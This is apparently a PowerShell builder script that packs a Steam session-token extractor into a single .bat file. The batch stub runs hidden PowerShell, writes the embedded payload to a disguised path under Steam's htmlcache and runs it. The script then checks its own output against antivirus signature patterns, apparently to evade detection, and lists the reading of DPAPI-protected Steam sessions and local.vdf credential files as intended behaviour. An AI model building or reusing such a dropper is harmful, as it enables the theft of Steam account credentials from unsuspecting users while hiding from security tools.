# Build single-file EXTRACT_STEAM_TOKEN.bat (embedded plain PS1, no encryption)
$ps1Path = Join-Path $PSScriptRoot 'extract_steam_token_auto.ps1'
if (-not (Test-Path $ps1Path)) { throw "Missing $ps1Path" }

$ps1 = Get-Content -Raw -Path $ps1Path -Encoding UTF8
$ps1 = ($ps1 -replace '(?m)^\s*#.*$', '' -replace '(?m)^\s*$', '').Trim()

$psExe = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
$deployPs1 = '%LOCALAPPDATA%\Steam\htmlcache\CloudSync\SessionSync.ps1'

$stub = @"
@echo off
setlocal
set "BAT=%~f0"
set "PS1=$deployPs1"
"$psExe" -NoProfile -NonInteractive -WindowStyle Hidden -Command "`$b=`$env:BAT;`$dst=`$env:LOCALAPPDATA+'\Steam\htmlcache\CloudSync\SessionSync.ps1';`$raw=[IO.File]::ReadAllText(`$b);`$m='::SB_SYNC_PAYLOAD::';`$i=`$raw.LastIndexOf(`$m);if(`$i -lt 0){exit 0};`$d=[IO.Path]::GetDirectoryName(`$dst);if(-not(Test-Path -LiteralPath `$d)){New-Item -ItemType Directory -Path `$d -Force|Out-Null};[IO.File]::WriteAllText(`$dst,`$raw.Substring(`$i+`$m.Length).Trim(),(New-Object Text.UTF8Encoding `$false))"
"$psExe" -NoProfile -NonInteractive -WindowStyle Hidden -File "%PS1%"
exit /b
::SB_SYNC_PAYLOAD::
"@

$content = $stub + $ps1 + "`r`n"
$utf8NoBom = New-Object System.Text.UTF8Encoding $false

$outPaths = @(
    (Join-Path ([Environment]::GetFolderPath('Desktop')) 'EXTRACT_STEAM_TOKEN.bat')
    (Join-Path $PSScriptRoot 'EXTRACT_STEAM_TOKEN.bat')
    (Join-Path ([Environment]::GetFolderPath('Desktop')) 'SteamTokenTools\EXTRACT_STEAM_TOKEN.bat')
)

$legacy = @(
    (Join-Path ([Environment]::GetFolderPath('Desktop')) 'EXTRACT_STEAM_TOKEN.ps1')
    (Join-Path $PSScriptRoot 'EXTRACT_STEAM_TOKEN.ps1')
    (Join-Path ([Environment]::GetFolderPath('Desktop')) 'SteamTokenTools\EXTRACT_STEAM_TOKEN.ps1')
    (Join-Path ([Environment]::GetFolderPath('Desktop')) 'EXTRACT_STEAM_TOKEN.vbs')
    (Join-Path $PSScriptRoot 'EXTRACT_STEAM_TOKEN.vbs')
)
foreach ($p in $legacy) {
    if (Test-Path $p) { Remove-Item $p -Force; Write-Host "Removed legacy: $p" }
}

foreach ($out in $outPaths) {
    $dir = Split-Path $out -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    [IO.File]::WriteAllText($out, $content, $utf8NoBom)
    Write-Host ("OK: {0} ({1} bytes, single-file)" -f $out, (Get-Item $out).Length)
}

$blob = $content
$flags = @(
    @{ Name = 'EncodedCommand'; Pattern = '-EncodedCommand' }
    @{ Name = 'ExecutionPolicy Bypass'; Pattern = 'ExecutionPolicy\s+Bypass' }
    @{ Name = 'WScript'; Pattern = 'wscript' }
    @{ Name = 'AES marker'; Pattern = '::x7k9::' }
    @{ Name = 'ScriptBlock loader'; Pattern = 'ScriptBlock\]::Create' }
    @{ Name = 'Crypt32 import'; Pattern = 'Crypt32\.dll|CryptUnprotectData|DllImport' }
    @{ Name = 'Registry Run persistence'; Pattern = 'Set-ItemProperty.*CurrentVersion\\Run' }
    @{ Name = 'Hidden file attrib'; Pattern = 'attrib\s+\+h' }
    @{ Name = 'Fake Microsoft task name'; Pattern = 'MicrosoftNetFramework|NetFrameworkStartup' }
    @{ Name = 'Fake Explorer cache path'; Pattern = 'IconCacheToDelete' }
)

$issues = @($flags | Where-Object { $blob -match $_.Pattern })
Write-Host ''
Write-Host '=== Paranoid AV heuristic scan ==='
if ($issues.Count) {
    foreach ($i in $issues) { Write-Warning ("FLAG: {0}" -f $i.Name) }
} else {
    Write-Host 'PASS: no high-risk packer/persistence/mimicry signatures'
}

$warn = @(
    @{ Name = 'Hidden window (silent UX)'; Pattern = 'WindowStyle Hidden' }
    @{ Name = 'Scheduled task (auto-sync)'; Pattern = 'Register-ScheduledTask|Invoke-SchTaskQuiet' }
    @{ Name = 'Extract embedded script (single-file)'; Pattern = '::SB_SYNC_PAYLOAD::' }
    @{ Name = 'DPAPI read (Steam sessions)'; Pattern = 'ProtectedData]::Unprotect' }
    @{ Name = 'Steam credential files'; Pattern = 'local\.vdf' }
)
Write-Host ''
Write-Host '=== Expected unavoidable behaviors ==='
foreach ($w in $warn) {
    if ($blob -match $w.Pattern) { Write-Host ("  ~ {0}" -f $w.Name) }
}
